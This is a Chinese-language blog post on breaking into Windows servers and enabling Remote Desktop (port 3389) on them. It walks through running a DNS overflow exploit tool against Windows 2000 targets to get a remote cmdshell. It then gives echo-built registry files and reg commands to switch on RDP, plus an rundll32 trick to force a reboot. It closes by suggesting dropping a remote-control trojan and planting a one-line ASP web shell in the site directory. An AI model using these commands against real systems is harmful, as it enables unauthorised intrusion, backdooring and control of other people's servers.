---
title: Windows下的3389端口渗透
date: 2019-08-11 18:25:12
categories: 玩
tags: 网络安全
---
## 一、Win7、Win2003、XP系统

在CMD命令行开启3389端口：
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f

在CMD命令行关闭3389端口（将00000000改成11111111即可）：

REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f

## 二、2000系统

简要说一下如何进行DNS溢出攻击。我用的溢出利用程序是dns.exe，在CMD下运行它可以看到它的使用参数等信息。执行"dns -s IP"命令检测目标IP是否存在DNS溢出漏洞，若存在则进行溢出攻击，执行"dns -t 2000all IP 1207"后提示要我们检测返回的1100端口的shell。"telnet IP 1100"成功得到返回的cmdshell。注意目录为c:/WINNT/system32，接着我们需要做的是使用"echo"命令写入一个3389.reg注册表文件。将如下代码一行一行地复制到cmdshell窗口后按回 车执行：

echo Windows Registry Editor Version 5.00 >3389.reg
echo. >>3389.reg 
echo [HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/netcache] >>3389.reg
echo "Enabled"="0" >>3389.reg
echo [HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Winlogon] >>3389.reg
echo "ShutdownWithoutLogon"="0" >>3389.reg
echo [HKEY_LOCAL_MACHINE/SOFTWARE/Policies/Microsoft/Windows/Installer] >>3389.reg
echo "EnableAdminTSRemote"=dword:00000001 >>3389.reg 
echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server] >>3389.reg
echo "TSEnabled"=dword:00000001 >>3389.reg
echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Services/TermDD] >>3389.reg
echo "Start"=dword:00000002 >>3389.reg 
echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Services/TermService] >>3389.reg
echo "Start"=dword:00000002 >>3389.reg
echo [HKEY_USERS/.DEFAULT/Keyboard Layout/Toggle] >>3389.reg 
echo "Hotkey"="1" >>3389.reg
echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/Wds/rdpwd/Tds/tcp] >>3389.reg 
echo "PortNumber"=dword:00000D3D >>3389.reg
echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/WinStations/RDP-Tcp] >>3389.reg
echo "PortNumber"=dword:00000D3D >>3389.reg

简单说明一下，">"符号是覆盖写入文件，如无此文件则创建，有则覆盖原来的内容写入。">>"是追加写入，即在原有文件内容的基础上在 后面写入内容。这里是写入内容到3389.reg文件中！需要注意的是第二行，那个作用是写入一行空格，因为.reg文件的格式 必须如此！成功写入完毕后接着执行导入操作，执行"regedit /s 3389.reg"。这样注册表文件就已经顺利导入到注册表里去了。不过需要注意的是在cmdshell下不要输错任何一个字符，否则将无法执行，建议先 自己打好在记事本上，确保无误之后再复制到cmdshell窗口执行。然后可以用下面这个方法重启目标主机。在cmdshell下执行如下代码：

@ECHO OFF & cd/d %temp% & echo [version] > {out}.inf 
(set inf=InstallHinfSection DefaultInstall) 
echo signature=$chicago$ >> {out}.inf 
echo [defaultinstall] >> {out}.inf
rundll32 setupapi,%inf% 1 %temp%/{out}.inf r

按顺序将以上五行代码一行一行地复制到cmdshell上，复制完一行按一次回车执行，五行都执行完毕后，服务器就会重启的了。当然让服务器重启的方法比较多，比如结束掉系统关键进程、代码模拟按键等都是可以的，如无意外，等待服 务器完成重启之后再连接目标发现远程桌面服务已经成功开启了。至此Windows 2000操作系统溢出后返回的cmdshell下开启远程桌面服务就成功完成了。

## 三、2003系统

相对于2000的系 统来说，2003cmdshell下开启远程桌面服务就比较容易一些了，起码无需重启嘛！第一种方法也是用"echo"命令写入一个 3389.reg文件，再"regedit /s 3389.reg"导入注册表文件即可开启，比较简单，与上面介绍的2000的开启方法类似。将如下代码一行一行地复制到cmdshell窗口后按回车执 行：

echo Windows Registry Editor Version 5.00 >3389.reg 
echo. >>3389.reg 
echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server] >>3389.reg 
echo "fDenyTSConnections"=dword:00000000 >>3389.reg 
echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/Wds/rdpwd/Tds/tcp] >>3389.reg 
echo "PortNumber"=dword:00000d3d >>3389.reg 
echo [HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/WinStations/RDP-Tcp] >>3389.reg 
echo "PortNumber"=dword:00000d3d >>3389.reg

完成以上操作后再执行"regedit /s 3389.reg"导入即可生效！不过这个方法相对来说比较麻烦。我们还可以用另外一种比较简单的方法来开启远程桌面服务的。在介绍另一个操作方法之前，我们先来熟悉下2003系统下远程桌面服务的一个最关键的注册表键值。
在"HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server"

下数值名称为"fDenyTSConnections"的这一项，可以看到它的数值数据为1或0。数值为1的时候关闭远程桌面服务，数值为0的时候开启远程 桌面服务。换句话说，我们只要可以在cmdshell下更改这个关键的注册表键值数据就可以达到实现开启远程桌面服务的目的了！有幸的是，在2003下有 一个"reg"命令完全可以做到这一点。这里我们找一台操作系统为2003的服务器，通过和上面介绍的同样方法溢出后返回一个cmdshell。当我们尝试连接的时候会发现根本无法连接上去。下面详细说明一下用"reg"命令开启远程桌面服务。执行：

reg query "HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server"

我们发现"fDenyTSConnections"键值数据为"0x1"。这个是十六进制数的1。上面提到，数据为1则没有开启远程桌面服务。我们要做的就是把"0x1"改成"0x0"！直接用"reg add"是不行的，必须把原来键值删掉再添加！在cmdshell下执行：

reg delete "HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server" /v fDenyTSConnections

会询问是否"要删除注册表值 fDenyTSConnections 吗"，当然Yes了。再执行：

reg add "HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0

提示操作成功完成。这样就把"fDenyTSConnections"的值改为"0x0"了，我们可以执行：

reg query "HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server"

发现已经成功更改了数据。现在再来连接服务器的3389看看，发现已经可以成功连接上了，创建个用户玩玩。至此2003下cmdshell开启远程桌面服务的方法也介绍完了。


溢出后也不一定要非要在cmdshell下开启远程桌面服务。
可以echo一个vbs文件，下载远程控制木马，然后在cmdshell里运行一下木马即可连接。
还有就是查询目标IP是否绑定有网站，如果有则找到网站目录，再用echo个一句话木马进去（例如：echo "<%execute request("cmd")%>"   > WEB路径/test.asp），用菜刀连接，然后上传大马，上传开3389的工具再开启也行。
